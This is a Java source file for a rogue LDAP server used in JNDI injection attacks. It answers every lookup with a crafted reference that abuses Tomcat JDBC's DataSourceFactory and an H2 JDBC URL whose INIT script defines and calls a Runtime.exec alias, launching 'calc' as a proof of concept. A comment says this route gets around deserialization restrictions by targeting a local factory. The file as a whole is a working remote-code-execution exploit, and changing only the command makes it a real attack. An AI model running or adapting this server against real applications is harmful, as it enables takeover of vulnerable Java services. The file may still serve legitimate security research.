package factory.trustSerialFalse;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class ldapserver {
    public static void main(String[] args) {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    1389,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[LDAP] Listening on 0.0.0.0:1389");
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    //tomcat-jdbc + h2
    //decodeReference 绕过decodeObject，打本地工厂
    public static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
            String base = searchResult.getRequest().getBaseDN();
            Entry e = new Entry(base);
            e.addAttribute("objectClass","javaNamingReference");

            e.addAttribute("javaClassName", "javax.sql.DataSource");
            e.addAttribute("javaFactory","org.apache.tomcat.jdbc.pool.DataSourceFactory");
            String JDBC_URL = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"1\"\\;}'\\;CALL EXEC ('calc')";
            e.addAttribute("javaReferenceAddress",new String[]{"/0/url/"+JDBC_URL,"/1/driverClassName/org.h2.Driver","/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1"});


            try {
                searchResult.sendSearchEntry(e);
                searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
